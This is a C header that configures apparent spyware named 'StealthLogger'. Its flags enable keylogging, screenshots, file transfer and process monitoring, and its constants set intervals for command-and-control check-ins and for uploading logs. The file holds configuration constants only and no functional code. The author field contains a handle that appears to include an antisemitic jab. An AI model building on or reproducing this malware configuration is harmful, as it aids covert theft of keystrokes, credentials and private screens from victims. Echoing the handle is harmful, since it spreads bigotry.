#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload configuration
#define PAYLOAD_NAME "StealthLogger"
#define PAYLOAD_VERSION "1.0.0"
#define PAYLOAD_AUTHOR "FaZe0wNsJeW"

// Compile-time options
#define ENABLE_KEYLOGGER 1
#define ENABLE_SCREENSHOT 1
#define ENABLE_FILE_TRANSFER 1
#define ENABLE_PROCESS_MONITOR 1

// Timing configuration
#define C2_CHECKIN_INTERVAL 300  // 5 minutes in seconds
#define LOG_UPLOAD_INTERVAL 1800 // 30 minutes in seconds
#define SCREENSHOT_INTERVAL 600  // 10 minutes in seconds

// Buffer sizes
#define MAX_LOG_SIZE 1024 * 1024  // 1MB
#define MAX_FILE_TRANSFER_SIZE 10 * 1024 * 1024  // 10MB
#define MAX_COMMAND_LENGTH 256

#endif // PAYLOAD_CONFIG_H